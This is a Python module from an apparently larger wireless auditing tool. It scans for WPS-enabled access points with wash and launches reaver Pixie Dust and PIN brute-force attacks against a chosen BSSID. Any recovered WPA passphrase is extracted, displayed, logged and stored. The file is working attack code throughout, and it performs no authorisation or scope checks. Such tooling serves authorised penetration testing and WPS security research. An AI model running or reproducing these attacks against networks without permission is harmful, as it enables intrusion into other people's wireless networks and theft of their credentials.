"""
wps_audit.py - WPS vulnerability scanner (Pixie Dust, PIN brute-force)
"""

import re
import shutil
import subprocess
import time
from typing import Optional

from rich.panel import Panel
from rich.table import Table
from rich import box

from utils import console, get_logger, run_command, SESSION

log = get_logger()


def scan_wps_networks(mon_iface: str, duration: int = 15) -> list[dict]:
    """
    Use wash to discover WPS-enabled networks.
    Returns a list of dicts with keys: bssid, ssid, channel, rssi, wps_version, wps_locked.
    """
    if not shutil.which("wash"):
        console.print("[red]wash not found. Install: sudo apt install reaver[/red]")
        return []

    console.print(f"[cyan]Scanning for WPS-enabled networks on {mon_iface} ...[/cyan]")
    log.info("WPS scan started on %s", mon_iface)

    try:
        proc = subprocess.Popen(
            ["wash", "-i", mon_iface, "--ignore-fcs"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )
        time.sleep(duration)
        proc.terminate()
        output, _ = proc.communicate(timeout=5)
    except FileNotFoundError:
        console.print("[red]wash not found.[/red]")
        return []
    except subprocess.TimeoutExpired:
        proc.kill()
        output = ""

    networks = _parse_wash_output(output)

    if not networks:
        console.print("[yellow]No WPS-enabled networks found.[/yellow]")
        return []

    _display_wps_table(networks)
    log.info("WPS scan found %d networks", len(networks))
    return networks


def _parse_wash_output(output: str) -> list[dict]:
    """Parse wash output into a list of network dicts."""
    networks = []
    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("BSSID") or line.startswith("-"):
            continue
        parts = line.split()
        if len(parts) < 5:
            continue
        if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", parts[0]):
            continue
        try:
            networks.append({
                "bssid": parts[0],
                "channel": int(parts[1]) if parts[1].isdigit() else 0,
                "rssi": int(parts[2]) if parts[2].lstrip("-").isdigit() else -100,
                "wps_version": parts[3] if len(parts) > 3 else "?",
                "wps_locked": parts[4].upper() == "YES" if len(parts) > 4 else False,
                "ssid": " ".join(parts[5:]) if len(parts) > 5 else "<hidden>",
            })
        except (ValueError, IndexError):
            continue
    return networks


def _display_wps_table(networks: list[dict]) -> None:
    table = Table(title="WPS-Enabled Networks", box=box.ROUNDED, show_lines=True, header_style="bold magenta")
    table.add_column("#", width=4)
    table.add_column("SSID", style="cyan", min_width=16)
    table.add_column("BSSID", min_width=17)
    table.add_column("CH", width=4, justify="right")
    table.add_column("Signal", justify="right", width=8)
    table.add_column("WPS Ver", width=8)
    table.add_column("Locked", justify="center", width=8)
    table.add_column("Risk", justify="center", width=10)

    for i, net in enumerate(networks, 1):
        locked = "[green]YES[/green]" if net["wps_locked"] else "[red]NO[/red]"
        risk = "[green]LOW[/green]" if net["wps_locked"] else "[bold red]CRITICAL[/bold red]"
        table.add_row(
            str(i),
            net["ssid"],
            net["bssid"],
            str(net["channel"]),
            f"{net['rssi']} dBm",
            net["wps_version"],
            locked,
            risk,
        )
    console.print(table)


def pixie_dust_attack(mon_iface: str, bssid: str, channel: int, ssid: str) -> Optional[str]:
    """
    Perform a Pixie Dust attack using reaver.
    This exploits a randomness flaw in some WPS implementations.
    Returns the WPA key if successful, or None.
    """
    if not shutil.which("reaver"):
        console.print("[red]reaver not found. Install: sudo apt install reaver[/red]")
        return None

    console.print(
        Panel(
            f"[bold]Pixie Dust Attack[/bold]\n\n"
            f"  Target : [cyan]{ssid}[/cyan] ({bssid})\n"
            f"  Channel: {channel}\n\n"
            "[dim]This attack exploits weak randomness in WPS implementations.\n"
            "Typically completes within seconds on vulnerable APs.[/dim]",
            border_style="yellow",
        )
    )
    log.info("Pixie Dust attack: bssid=%s channel=%d ssid=%s", bssid, channel, ssid)

    cmd = [
        "reaver",
        "-i", mon_iface,
        "-b", bssid,
        "-c", str(channel),
        "-K", "1",       # Pixie Dust mode
        "-v",
        "--no-associate",
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        console.print("[yellow]Pixie Dust attack timed out (AP likely not vulnerable).[/yellow]")
        return None

    return _parse_reaver_output(result.stdout, ssid)


def wps_pin_attack(
    mon_iface: str,
    bssid: str,
    channel: int,
    ssid: str,
    timeout: int = 3600,
) -> Optional[str]:
    """
    Perform a WPS PIN brute-force attack using reaver.
    This tries all 11,000 possible WPS PINs.
    """
    if not shutil.which("reaver"):
        console.print("[red]reaver not found.[/red]")
        return None

    console.print(
        Panel(
            f"[bold]WPS PIN Brute-Force[/bold]\n\n"
            f"  Target  : [cyan]{ssid}[/cyan] ({bssid})\n"
            f"  Channel : {channel}\n"
            f"  Timeout : {timeout}s (~{timeout//3600}h)\n\n"
            "[dim]Trying all ~11,000 WPS PINs. Rate-limiting may apply.[/dim]",
            border_style="yellow",
        )
    )
    log.info("WPS PIN attack: bssid=%s channel=%d ssid=%s", bssid, channel, ssid)

    cmd = [
        "reaver",
        "-i", mon_iface,
        "-b", bssid,
        "-c", str(channel),
        "-v",
        "--no-associate",
        "--max-wait", "30",
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        console.print("[yellow]WPS PIN attack timed out.[/yellow]")
        return None

    return _parse_reaver_output(result.stdout, ssid)


def _parse_reaver_output(output: str, ssid: str) -> Optional[str]:
    """Extract WPA key from reaver output."""
    for line in output.splitlines():
        line = line.strip()
        if "WPA PSK" in line or "WPA key" in line.lower():
            # Format: [+] WPA PSK: 'password'
            match = re.search(r"['\"]([^'\"]+)['\"]", line)
            if match:
                key = match.group(1)
                console.print(
                    Panel(
                        f"[bold red]WPS PIN CRACKED[/bold red]\n\n"
                        f"  Network : [cyan]{ssid}[/cyan]\n"
                        f"  WPA Key : [bold green]{key}[/bold green]",
                        title="[bold red]!! CREDENTIAL RECOVERED !![/bold red]",
                        border_style="red",
                    )
                )
                log.critical("WPS key cracked: ssid=%s key=%s", ssid, key)
                SESSION.setdefault("cracked_keys", []).append({
                    "key": key,
                    "tool": "reaver (WPS)",
                    "ssid": ssid,
                })
                return key

    console.print("[yellow]WPS attack did not recover the key.[/yellow]")
    return None
